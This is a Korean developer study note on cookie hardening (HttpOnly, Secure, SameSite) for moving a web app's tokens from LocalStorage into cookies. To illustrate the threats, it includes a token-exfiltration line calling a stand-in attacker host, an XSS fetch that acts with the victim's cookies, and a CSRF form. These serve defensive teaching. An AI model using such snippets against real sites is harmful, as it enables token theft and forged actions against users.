# 65. HttpOnly · Secure · SameSite — 한 단어씩 곱씹어보기

> 작성 시점: 2026-04-28
> 트랙: `infra-tls-hardening` (분리 트랙 — 후속 `token-auto-renewal` 본 작업의 전제 인프라)
> 출발점: [`docs/knowledge/realtime/token-renewal-patterns.md` §5.3·5.4](../knowledge/realtime/token-renewal-patterns.md) — 산업 표준 리서치
> 진단 연결: [#54 유령 캐릭터 진단](./54-presence-cleanup-ghost-character-diagnosis.md) — 토큰 재발급이 displayId stale 을 만들어 자기인식이 깨졌던 사건. 그 사건의 근본 처방이 본 트랙이다.

---

## 0. 이 노트는 어떻게 읽어야 하나

이 노트는 정의를 외우러 온 게 아니다.
**"우리 코드가 지금 어디에 토큰을 두고 있고, 그걸 옮기면 어떤 공격이 어떻게 막히고, 어떤 공격은 그래도 안 막히는가"** 를 한 속성씩 직접 곱씹는 자리다.

세 속성(HttpOnly · Secure · SameSite) 은 각자 막는 게 다르고, 각자 못 막는 게 다르다. 한 속성만 보면 "안전해졌다" 는 착각이 생긴다. 셋이 모여야 의미가 있다.
세 속성이 무엇을 약속하고 무엇을 약속하지 않는지 — 자기 말로 한 줄씩 풀어볼 수 있게 되는 게 본 노트의 끝.

---

## 1. 출발점 — 마음의 고향이 지금 토큰을 어디에 두고 있나

`frontend/src/lib/auth.ts:14`

```ts
const TOKEN_KEY = 'accessToken';
```

`frontend/src/lib/auth.ts:30`

```ts
export function getUserIdFromToken(): number | null {
  const token = localStorage.getItem(TOKEN_KEY);
  ...
}
```

저장은 `LoginPrompt.tsx:51`:

```ts
const token = await authenticate(email, password);
localStorage.setItem('accessToken', token);
```

요청에 첨부는 `lib/api/client.ts:11-17`:

```ts
apiClient.interceptors.request.use((config) => {
  const token = localStorage.getItem('accessToken');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

WS CONNECT 헤더에도 LocalStorage 에서 직접 꺼내서 붙임 (`useStomp.ts:94, 187`).

**한 줄 요약**: 우리는 access token 을 **JS 가 동기적으로 읽을 수 있는 LocalStorage 에 평문으로 저장하고**, 모든 요청 직전에 꺼내 `Authorization: Bearer ...` 헤더로 박는다.

### 이게 왜 위험한가

[token-renewal-patterns.md:185-190](../knowledge/realtime/token-renewal-patterns.md):

> | Access token | **메모리 (React state)** | XSS 노출 최소화. 페이지 새로고침 시 silent refresh 로 복원 |
> | Refresh token | **HttpOnly + Secure + SameSite 쿠키** | XSS 로 훔칠 수 없음. CSRF 는 SameSite 와 CSRF 토큰으로 방어 |
> LocalStorage 저장은 XSS 시 즉시 토큰 탈취 → 권장 안 됨.

**XSS 한 줄이면 끝난다.**
어떤 경로로든(npm 공급망 — [#05](./05-supply-chain-attack-axios.md) 가 우리에게 일어났던 일이다 — 또는 광고 스크립트, 사용자 작성 콘텐츠) 임의의 JS 가 우리 페이지에서 실행되면, 첫 줄이 `localStorage.getItem('accessToken')` 이고 둘째 줄이 `fetch('https://attacker/leak', { method: 'POST', body: ... })` 다. 사용자는 자기 토큰이 새는 걸 모른다. 토큰은 1시간 유효하므로 1시간 동안 공격자는 우리 사용자다.

그래서 산업 표준은 토큰을 **JS 가 절대 읽을 수 없는 곳** 에 둔다. 그 곳이 HttpOnly cookie 다.

하지만 cookie 도 cookie 나름이다. HttpOnly 만 켠다고 안전해지는 게 아니다.
**HttpOnly + Secure + SameSite — 이 셋이 한 묶음으로 동작해야** 의미가 있다. 한 속성씩 곱씹어보자.

---

## 2. HttpOnly — "JS 야 너 이거 못 본다"

### 2.1 막는 것

브라우저는 cookie 에 `HttpOnly` 플래그가 있으면 **`document.cookie` API 에 그 cookie 를 노출하지 않는다.** JS 가 어떤 트릭을 써도 못 읽는다. 즉:

- 광고 스크립트가 페이지에 침투해서 `document.cookie` 를 leak 해도 → 우리 토큰은 안 나간다
- React 컴포넌트가 untrusted input 을 dangerouslySetInnerHTML 로 렌더링해서 XSS 가 터져도 → 토큰은 안 나간다
- npm 공급망 공격으로 의존성이 악성으로 바뀌어도 → 토큰은 안 나간다

**LocalStorage 와의 결정적 차이**: LocalStorage 는 JS 가 같은 origin 안에 있으면 무조건 읽는다. "이 스크립트만 못 읽게" 라는 격리가 안 된다. HttpOnly cookie 는 origin 이 같아도 JS 자체에서 격리된다.

### 2.2 못 막는 것 (이게 함정이다)

**XSS 가 cookie 를 못 읽어도, 공격은 가능하다.**

그 페이지에서 임의 JS 가 실행되고 있다는 건, **"공격자가 우리 사용자처럼 우리 API 를 호출할 수 있다"** 는 뜻이다. cookie 는 같은 origin 으로 가는 요청에 자동 첨부된다. 공격자는 토큰을 읽을 필요가 없다. **사용자의 브라우저 안에서** 우리 API 를 직접 부르면, cookie 는 그냥 자동으로 따라간다.

```js
// XSS 가 박혀서 실행되는 코드 — 토큰을 읽을 필요 없다
fetch('https://api.ghworld.co/me/spaces/items', {
  method: 'POST',
  body: JSON.stringify({ /* 악의적 변경 */ }),
  credentials: 'include',  // cookie 자동 첨부
});
```

**HttpOnly 가 막는 건 "토큰 탈취" — 즉 공격자 서버로 토큰이 새 나가는 것** 까지다. 토큰이 새 나가면 공격자는 자기 컴퓨터에서, 자기가 원할 때, 1시간 내내 공격할 수 있다. 새 나가지 않으면 공격은 사용자가 그 페이지를 열어둔 동안만 가능하다 — 사용자가 탭을 닫는 순간 공격은 끝난다. **이 차이는 크다.** 그러나 "탭이 열려있는 동안의 공격" 은 여전히 가능하다.

### 2.3 또 하나의 함정

HttpOnly cookie 도 **응답 본문에 토큰이 echo 되거나 디버그 로그에 찍히면** 새어나간다. 흔한 사고:

- `/auth/login` 응답 본문에 `{ "accessToken": "..." }` 도 같이 넣고 cookie 도 굽는다 → 본문에서 새 나간다
- 백엔드 access log 에 `Cookie: refreshToken=...` 가 통째로 찍힌다 → 로그 노출 시 새 나간다

cookie 로 옮기면서 **본문에서는 토큰을 빼고**, **로그 마스킹** 도 같이 점검해야 한다.

### 2.4 결론 — HttpOnly 하나로는 부족하다

HttpOnly 는 "토큰이 우리 브라우저 메모리 밖으로 나가는 것" 을 막는다. 좋다.
하지만 "우리 사용자처럼 행동하는 공격" 은 못 막는다. 그건 다른 두 속성 — Secure 와 SameSite — 가 분담한다.

> 곱씹어볼 것: HttpOnly 가 켜져 있는 상황에서 우리가 여전히 두려워해야 할 공격 시나리오는 무엇인가? 답이 머릿속에 그려져야 다음 절로 넘어가도 된다.

---

## 3. Secure — "HTTPS 가 아니면 너 안 갈 거야"

### 3.1 막는 것

`Secure` 플래그가 있는 cookie 는 **HTTPS 요청에만 첨부된다.** 평문 HTTP 요청에는 따라가지 않는다.

이게 막는 시나리오: **MITM (man in the middle).**
공항 와이파이에 붙어있는 사용자가 어떤 페이지를 평문 HTTP 로 열면, 그 와이파이를 가로챈 공격자는 모든 트래픽을 본다. 만약 우리 cookie 가 Secure 가 없으면, 그 평문 요청에도 cookie 가 붙어 공격자에게 통째로 노출된다.

`Secure` 가 있으면 브라우저가 평문 요청에는 cookie 를 안 붙이므로 평문 노출이 사라진다.

### 3.2 함정 1 — 로컬 개발 환경

로컬에서 `http://localhost:3000` ↔ `http://localhost:8080` 으로 띄우면 **HTTPS 가 아니다.** 그러면 Secure cookie 는 동작하지 않을 수 있다.

다만 [Chrome 75+ 부터 localhost 는 secure context 로 간주](https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts) 한다. 즉 localhost 는 HTTPS 가 아니어도 Secure cookie 가 동작한다. Firefox 도 비슷한 처리. Safari 는 [추정] 더 보수적일 수 있어 별도 검증이 필요.

**실무 결론**: `Secure` 플래그는 **prod 에서는 항상 켜고, 로컬은 환경 변수로 분기** 한다.

```kotlin
// 백엔드 의사코드 — 실제 작성 시점에 다시 검증
val cookie = ResponseCookie.from("refreshToken", token)
    .httpOnly(true)
    .secure(profile == "prod")  // local 은 false, prod 는 true
    .sameSite("Lax")
    .domain(".ghworld.co")  // 옵션 A 가정 — §4.3 참조
    .path("/")
    .maxAge(Duration.ofDays(7))
    .build()
```

### 3.3 함정 2 — HSTS 가 없는 첫 요청

HSTS (HTTP Strict Transport Security) 가 없는 도메인의 **첫 요청** 은 사용자가 주소창에 `ghworld.co` 라고만 치면 평문 HTTP 일 수 있다 (브라우저가 자동으로 https:// 붙이지 않음). 이때:

- Secure cookie 는 안 가서 보안적으론 OK
- **하지만 사용자는 그 첫 요청에서 401 을 만난다** — UX 함정
- 백엔드가 평문 요청을 https 로 redirect 하더라도, redirect 응답 자체가 평문에 노출된 적이 있는 셈

해법: **HSTS 헤더를 켠다.** 한 번이라도 https 로 들어온 적 있는 도메인은 그 후 항상 https 로만 접근하도록 브라우저가 강제한다.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

### 3.4 마음의 고향 적용

우리는 백엔드를 **AWS ALB + ACM 인증서로 HTTPS 강제** 한다 ([#35 AWS EC2 첫 배포](./35-aws-ec2-first-deployment.md), [reference_aws_deployment.md](../../memory)). 즉 Secure cookie 는 prod 에서 자연스럽게 동작한다.

남은 작업:
1. 백엔드 응답에 HSTS 헤더 추가 (Spring Security `headers().httpStrictTransportSecurity()`)
2. 로컬 개발은 `Secure(false)`, prod 는 `Secure(true)` 로 분기 — `application-{profile}.yml` 에서 결정

> 곱씹어볼 것: Secure 플래그가 막아주는 공격은 "passive eavesdropping" 이다. 능동적으로 우리 페이지에 코드를 박는 공격(XSS) 은 못 막는다. 그건 누가 막나? 답: HttpOnly. 셋의 분업이 보이기 시작한다.

---

## 4. SameSite — "이 cookie 가 어디서 출발한 요청에 따라가는지"

### 4.1 왜 가장 헷갈리나

세 속성 중 SameSite 가 가장 어렵다. 이유:
- 동작이 단순한 on/off 가 아니라 **3가지 모드 (Strict / Lax / None)** 가 있다
- "same-site 인지 cross-site 인지" 의 정의가 직관과 다르다 (subdomain 이 same-site 다)
- top-level navigation 이냐 iframe 이냐 fetch 냐에 따라 행동이 다르다
- 2020년 Chrome 80 의 기본값 변경으로 큰 분기점이 있다

천천히 가자.

### 4.2 3가지 모드 비교

| | Strict | Lax | None |
|---|---|---|---|
| 같은 사이트 내 요청 | 보냄 | 보냄 | 보냄 |
| 외부 사이트 → 우리 사이트 **top-level navigation** (`<a href>` 클릭, 주소창 입력) | **안 보냄** | **보냄** | 보냄 |
| 외부 사이트 → 우리 사이트 **iframe / fetch / form POST** | 안 보냄 | 안 보냄 | 보냄 |
| Secure 필수 여부 | 아니오 | 아니오 | **예 (브라우저 강제)** |
| Chrome 80+ 기본값 | — | **✅ 기본** | — |

### 4.3 "같은 사이트(same-site)" 의 정확한 정의

여기서 핵심: **"같은 사이트" 의 기준은 origin 이 아니라 [registrable domain](https://developer.mozilla.org/en-US/docs/Glossary/Site) (eTLD+1) 이다.**

- `app.ghworld.co` 와 `api.ghworld.co` → 둘 다 `ghworld.co` 가 eTLD+1 → **same-site** ✅
- `app.ghworld.co` 와 `maeum-village.vercel.app` → eTLD+1 이 다름 → **cross-site** ❌
- `app.ghworld.co:3000` 과 `app.ghworld.co:3001` → 포트 달라도 same-site ✅ (origin 은 다르지만)

이 정의가 우리 결정의 분기점이다.

### 4.4 Chrome 80 (2020년) 의 기본값 변경 — 왜 의미 있나

[2020년 2월 Chrome 80](https://blog.chromium.org/2020/02/samesite-cookie-changes-in-february.html) 부터 `SameSite` 속성 명시가 없는 cookie 의 기본값이 **None → Lax** 로 바뀌었다. 의미:

- **이전**: 모든 cookie 가 cross-site 요청에도 따라갔음 → CSRF 공격이 매우 쉬웠음
- **이후**: 명시 안 하면 Lax → cross-site form POST 같은 위험 시나리오에서 cookie 안 나감 → CSRF 가 자연스럽게 막힘

즉 **2020년 이후 인터넷의 기본 가정은 "Lax"** 이다. 우리도 별 이유 없으면 Lax 가 출발점.

### 4.5 SameSite=None + Secure 의 강제 짝꿍

[2020년 Chrome 80 부터 SameSite=None 인 cookie 는 반드시 Secure 도 같이 있어야 한다.](https://web.dev/articles/samesite-cookie-recipes) 없으면 브라우저가 **cookie 자체를 거부** 한다.

이유: SameSite=None 은 cross-site 요청에도 cookie 를 보낸다는 뜻인데, 그게 평문 HTTP 로 가면 위험성이 폭증하므로 강제로 HTTPS 만 허용.

### 4.6 CSRF 메커니즘 — 직접 그려보기

CSRF 가 뭔지 손으로 따라가보자. SameSite 가 무엇을 막는지 머리로 그려져야 한다.

**시나리오 (SameSite 없던 시절):**

1. 사용자가 `app.ghworld.co` 에 로그인 → 브라우저가 cookie 보관
2. 사용자가 같은 브라우저에서 `evil-site.com` 방문
3. `evil-site.com` 에 이런 form 이 있음:

   ```html
   <form action="https://api.ghworld.co/me/spaces/items" method="POST">
     <input name="itemId" value="공격자가 원하는 값">
     <input type="submit" value="귀여운 무료 아이템 받기!">
   </form>
   ```

4. 사용자가 클릭 → 브라우저는 `api.ghworld.co` 로 form POST 를 날림
5. **이때 브라우저는 `api.ghworld.co` 의 cookie 를 자동 첨부함** — origin 이 다른 사이트에서 출발한 요청인지 모름
6. 서버는 valid 한 cookie 를 보고 사용자가 한 행동으로 처리 → 공격 성공

**SameSite=Lax 가 켜진 후:**

같은 5번 단계에서, 브라우저가 "이 요청은 evil-site.com 에서 출발한 cross-site form POST 다 → Lax cookie 는 top-level navigation 만 동반함, form POST 는 동반 안 함" 을 알고 cookie 를 빼버린다. 서버는 인증 정보 없는 요청으로 보고 거부.

**SameSite=Strict 면 더 강함:**

사용자가 evil-site.com 에서 우리 사이트 링크(`<a href="https://app.ghworld.co/...">`)를 클릭해서 정상적으로 들어와도 cookie 가 안 따라간다. 즉 evil-site 가 만든 어떤 형태의 진입도 인증 없이 도착함. 단점: **정상 사용자 UX 도 떨어진다** — 외부 블로그에서 우리 사이트로 들어오는 링크를 클릭했는데 로그아웃 상태처럼 보임.

> 곱씹어볼 것: 우리 서비스의 핵심 동선에서 "외부 사이트에서 링크 타고 들어와도 로그인 유지되어야 한다" 가 깨지면 어떤 UX 문제가 생기나? 마음의 고향처럼 외부 SNS 공유로 들어오는 링크가 흔하다면 Strict 는 과하다. **Lax 가 합리적 출발점.**

### 4.7 마음의 고향 도메인 구조와 두 옵션

**옵션 (A) — 같은 부모 도메인 (subdomain 분리)**

```
프론트: app.ghworld.co  (Vercel 또는 ALB → Next.js)
백엔드: api.ghworld.co  (ALB → Spring)
```

- eTLD+1: `ghworld.co` 로 동일 → **same-site**
- cookie 의 `Domain=.ghworld.co` 로 굽거나, 더 좁게 `Domain=api.ghworld.co` 로 굽고 fetch 시 credentials 전달
- **`SameSite=Lax` 충분.** CSRF 자동 방어. Strict 는 과함.
- CORS 도 단순 — 같은 site 내 요청은 CORS preflight 가 덜 까다로움

**옵션 (B) — 완전 다른 도메인 (Vercel 기본 도메인)**

```
프론트: maeum-village.vercel.app
백엔드: api.ghworld.co
```

- eTLD+1: `vercel.app` vs `ghworld.co` → **cross-site**
- cookie 가 `api.ghworld.co` 도메인으로 구워졌어도 fetch 가 cross-site 라 자동으로 안 따라감
- 이 경우 **`SameSite=None` + `Secure` 필수**
- 추가로:
  - 프론트 fetch: `credentials: 'include'`
  - 백엔드 CORS: `Access-Control-Allow-Credentials: true`
  - 백엔드 CORS: `Access-Control-Allow-Origin: https://maeum-village.vercel.app` (와일드카드 `*` 는 `Allow-Credentials: true` 와 같이 못 씀 — 브라우저 거부)
- CSRF 자동 방어 효과는 사라짐 → **CSRF 토큰을 수동으로 도입해야 함** (double submit cookie 또는 custom header)

### 4.8 third-party cookie phase-out — 미래의 함정

[Chrome 의 third-party cookie 단계적 폐지](https://developers.google.com/privacy-sandbox/3pcd) 가 진행 중. Safari ITP 와 Firefox ETP 도 이미 third-party cookie 를 강하게 제한한다.

**SameSite=None cookie 는 third-party cookie 로 분류** 될 수 있어, 미래에 cross-site 시나리오에서 막힐 위험이 있다. 즉 옵션 (B) 는 **장기적으로 위험한 베팅** 이다.

> 곱씹어볼 것: 옵션 (A) 와 (B) 중 어느 쪽으로 가야 하나? 보안적으로도 미래 호환성으로도 (A) 가 우월. 단 (A) 는 도메인 셋업 한 단계 더 — `app.ghworld.co` 를 Vercel 또는 우리 ALB 에 가리키는 DNS 작업이 필요. 본 트랙 결정 게이트에서 정하자.

### 4.9 "그래서 SameSite 가 막는 게 뭐였더라?"

**CSRF.** 그게 거의 전부다.

- XSS? 못 막는다 (SameSite 는 같은 사이트 내 JS 가 자기 cookie 를 쓰는 걸 막지 않음)
- MITM? 못 막는다 (그건 Secure 의 일)
- 세션 도난? 못 막는다 (그건 HttpOnly + Secure + 짧은 TTL 의 일)

CSRF 만 막고, 그 외엔 다른 친구들에게 맡긴다. 이게 SameSite 다.

---

## 5. 삼위일체 매트릭스 — 누가 뭘 막나

| 공격 시나리오 | HttpOnly | Secure | SameSite=Lax |
|---|---|---|---|
| **XSS 로 토큰 탈취** (script 가 읽어서 외부로 leak) | ✅ 막음 | — | — |
| **XSS 로 사용자처럼 행동** (read 안 하고 fetch 만 호출) | ❌ | — | — (같은 사이트 내) |
| **MITM** (공항 와이파이, 평문 가로채기) | — | ✅ 막음 | — |
| **CSRF** (외부 사이트에서 form POST · img · iframe) | — | — | ✅ 막음 |
| **도난된 디바이스** (잠금 해제된 노트북) | ❌ (브라우저 안에 그대로 있음) | ❌ | ❌ |
| **CSRF 변종 — 외부에서 GET 요청 유도** (img 태그) | — | — | ✅ 막음 (Lax 도 cross-site GET 은 차단 — top-level 만 보냄) |
| **세션 고정 (session fixation)** | ❌ | ❌ | ❌ (별도: 로그인 후 session ID 재발급으로 방어) |
| **로그 노출 / 본문 echo** | ❌ (cookie 가 본문/로그에 박히면 의미 없음) | — | — |

읽고 나서 머리에 남아야 하는 것:

1. **XSS 가 일어나는 순간 어떤 cookie 속성도 충분하지 않다.** HttpOnly 가 토큰 탈취는 막지만, "사용자 권한으로 행동" 은 못 막는다. 그래서 XSS 자체를 막아야 한다 — CSP, 입력 escape, dangerouslySetInnerHTML 금지, npm 공급망 점검 ([#05](./05-supply-chain-attack-axios.md))
2. **CSRF 는 SameSite 가 거의 무료로 막아준다.** 단 SameSite=None 으로 가는 순간 그 무료 방어가 사라지고 CSRF 토큰을 수동 구현해야 한다.
3. **MITM 은 Secure + HSTS 가 막는다.** ALB+ACM 환경이면 prod 는 자연스러움.
4. **셋이 모여야 의미가 있다.** 한 속성만 켜고 안심하면 안 된다.

### 그럼 우리가 LocalStorage → cookie 로 옮기면서 얻는 것은?

| 위험 | LocalStorage 일 때 | HttpOnly cookie 일 때 |
|---|---|---|
| XSS 토큰 탈취 | **즉시 leak** (1시간 동안 무제한 사용 가능) | leak 안 됨 (단 그 페이지 안에서만 악용 가능) |
| MITM | 보낼 때 평문이면 leak | Secure 가 차단 |
| CSRF | (영향 없음 — 어차피 LS 는 자동 첨부 안 됨, 직접 헤더에 박아야 함) | SameSite=Lax 가 차단 |

**CSRF 는 LocalStorage 일 때 자동 방어다** (cookie 가 자동 첨부 안 되니까). cookie 로 옮기면서 이 무료 방어가 사라지고 SameSite 로 다시 만들어야 한다. 즉 cookie 로 가는 게 **무조건 안전해지는 것이 아니다.** XSS 위험을 줄이는 대신 CSRF 위험을 새로 떠안는다. 그리고 SameSite 로 그걸 다시 막는다. **트레이드오프의 위치가 바뀌는 것** 이지 위험이 사라지는 게 아니다. 하지만 XSS 위험 감축이 훨씬 크기 때문에 가치 있는 교환이다.

---

## 6. 마음의 고향 트랙 적용 결정 (작성 시점 가설)

> 본 결정은 트랙 결정 게이트에서 사용자 승인을 받기 전 가설이다. 본 노트가 그 가설의 근거 기록이다.

### 6.1 토큰별 저장 위치

| 토큰 | 저장 위치 | 이유 |
|---|---|---|
| **Access token** | **메모리 (React state, Context 또는 Zustand)** | XSS 노출 시간 최소화. 페이지 새로고침 시 silent refresh 로 복원 |
| **Refresh token** | **HttpOnly + Secure + SameSite=Lax cookie** | XSS 로 못 훔침. CSRF 는 Lax + 옵션 A same-site 구조로 자동 방어 |

### 6.2 Cookie 속성 셋업 (옵션 A 가정)

```text
Set-Cookie: refreshToken={jwt};
            HttpOnly;
            Secure;                    (prod 만, 로컬은 OFF)
            SameSite=Lax;
            Domain=.ghworld.co;        (subdomain 공유 위해 점 prefix)
            Path=/;
            Max-Age=604800             (7일)
```

선택 이유:
- **HttpOnly**: §2 — XSS 토큰 탈취 차단
- **Secure**: §3 — MITM 차단. 로컬은 false 분기
- **SameSite=Lax**: §4 — CSRF 자동 방어. Strict 는 외부 링크 진입 UX 깨짐
- **Domain=.ghworld.co**: 옵션 A 의 핵심. `app.ghworld.co` 와 `api.ghworld.co` 가 같은 cookie 공유
- **Path=/**: refresh 엔드포인트만 보낼 거면 `/auth/refresh` 로 좁힐 수 있지만, [추정] 그게 큰 보안 이득은 아니고 운영 복잡도만 올림

### 6.3 CSRF 추가 방어

SameSite=Lax 는 cross-site form POST · iframe · fetch 는 막지만, **cross-site top-level GET** (예: `<a href="https://api.ghworld.co/transfer?to=evil&amount=1000">` 클릭 유도) 은 막지 않는다. 이 위험을 줄이려면:
- **상태 변경 엔드포인트는 GET 으로 노출하지 않는다** (REST 컨벤션이기도 함 — 자연스럽게 지켜짐)
- Mutating endpoint(POST/PUT/DELETE) 에는 추가로 **CSRF 토큰** 또는 **custom header 검증** 을 둔다 — 우리는 이미 `Authorization: Bearer` 헤더를 access token 으로 쓰므로, 그 헤더 자체가 사실상 custom header CSRF 방어 역할을 한다 (cross-site form POST 는 custom header 못 박음). 즉 access token 을 헤더로 보내는 한 추가 CSRF 토큰은 **선택 사항**.

### 6.4 운영 / 로컬 분기

| 환경 | Secure | Domain | Frontend Origin | Backend Origin |
|---|---|---|---|---|
| local | false | (생략 또는 localhost) | http://localhost:3000 | http://localhost:8080 |
| prod | true | .ghworld.co | https://app.ghworld.co | https://api.ghworld.co |

`application.yml` 의 cookie 설정을 프로파일별로 분리. ([#06](./06-spring-boot-profile-strategy.md))

### 6.5 미해결 / 다음 노트로 넘기는 것

- **CSRF 토큰을 추가로 도입할지 여부의 최종 결정**: 6.3 에서 "선택 사항" 으로 분류했지만 운영 보수성 관점에서 한 번 더 평가 필요
- **옵션 A vs B 의 최종 결정**: DNS 셋업 일정과 함께 판단 — 본 노트는 (A) 가정
- **Idle session 정의** (`/auth/refresh` 만 idle 갱신할지, WS 연결 유지가 idle 갱신을 트리거할지): #61 에서 다룸
- **Refresh token rotation + reuse detection** 의 race condition 처리: #62 에서 다룸
- **게스트의 LocalStorage `guestId` 와 cookie 의 관계**: #63 에서 다룸 (게스트의 영속 식별자는 cookie 로 안 가도 될 수 있음 — 토큰과 다른 라이프사이클)
- **WS 토큰 갱신 패턴** (재연결 vs in-band): #64 에서 다룸

---

## 7. 자기 검증 — 한 줄로 답할 수 있나

여기까지 읽고 자기 말로 답해보면 노트의 효용이 측정된다. 답이 막히면 해당 절로 돌아간다.

1. HttpOnly 가 막는 것은? 못 막는 것은? (§2)
2. Secure 없는 cookie 가 위험한 시나리오 한 개? (§3.1)
3. SameSite=Strict 와 Lax 의 가장 큰 실용 차이? (§4.6)
4. `app.ghworld.co` 와 `api.ghworld.co` 사이가 same-site 인 이유? (§4.3)
5. SameSite=None 을 쓰려면 동반되어야 하는 속성? (§4.5)
6. LocalStorage 에서 cookie 로 옮기면서 새로 생기는 위험은? 어떻게 막나? (§5 마지막)
7. 우리 prod 에서 Secure cookie 가 자연스럽게 동작하는 인프라적 이유는? (§3.4)

---

## 8. 더 읽을거리

### 표준 / 명세
- [RFC 6265bis — Cookies: HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis) — cookie 명세 자체. SameSite 정의가 여기 있음
- [MDN — Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) — 일상 레퍼런스
- [MDN — Site (definition)](https://developer.mozilla.org/en-US/docs/Glossary/Site) — same-site 의 공식 정의

### 보안 가이드
- [OWASP — Session Management Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP — CSRF Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP — XSS Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### 실전 변경점·해설
- [Chrome 80 SameSite changes (2020-02)](https://blog.chromium.org/2020/02/samesite-cookie-changes-in-february.html)
- [web.dev — SameSite cookie recipes](https://web.dev/articles/samesite-cookie-recipes) — 실전 케이스별 코드
- [Chrome — Third-party cookie phase-out](https://developers.google.com/privacy-sandbox/3pcd)
- [Auth0 — Cookies vs Tokens for storing JWT](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
- [Wisp — LocalStorage vs HttpOnly Cookies](https://www.wisp.blog/blog/understanding-token-storage-local-storage-vs-httponly-cookies)

### 본 프로젝트 내부 참조
- [`docs/knowledge/realtime/token-renewal-patterns.md`](../knowledge/realtime/token-renewal-patterns.md) — 산업 사례 리서치 (출발점)
- [#54 유령 캐릭터 진단](./54-presence-cleanup-ghost-character-diagnosis.md) — 본 트랙의 발단
- [#24 STOMP JWT ChannelInterceptor](./24-stomp-websocket-jwt-channel-interceptor.md) — 현재 STOMP 인증 구현
- [#05 npm 공급망 공격](./05-supply-chain-attack-axios.md) — XSS 가 우리에게 일어났던 구체적 경로 사례

---

## 다음 노트로 넘기는 질문

> "토큰 갱신 시점을 무엇으로 트리거할 것인가 — 사용자의 HTTP 활동인가, WS 연결 생존인가, 아니면 명시적 사용자 액션인가?
> 마음의 고향처럼 사용자가 마을에 들어와 가만히 앉아서 채팅만 보는 패턴이 흔한 서비스에서, '활동' 의 정의는 어떻게 잡아야 하나?"

→ #61 — Idle session 정의 트레이드오프
